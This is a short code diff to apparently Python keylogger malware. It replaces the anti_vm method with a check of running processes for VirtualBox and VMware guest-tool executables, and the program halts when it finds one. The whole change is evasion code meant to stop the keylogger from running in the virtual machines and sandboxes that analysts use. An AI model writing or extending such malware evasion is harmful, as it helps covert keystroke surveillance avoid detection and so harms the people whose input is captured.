@@ -5,6 +5,7 @@ import logging
 import mouse
 import os
 import platform
+import psutil
 import pyautogui
 import socket
 import subprocess
@@ -216,8 +217,11 @@ class Keylogger:
             self.stop()
 
     def anti_vm(self):
-        if sys.prefix != sys.base_prefix:
-            self.stop()
+        vm_exe = ["vmsrvc.exe" , "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vboxservice.exe"]
+        for process in psutil.process_iter():
+            for i in vm_exe:
+                if i in process.name().lower():
+                    self.stop()
 
 #--------------- START / STOP ---------------#
     def activate(self):
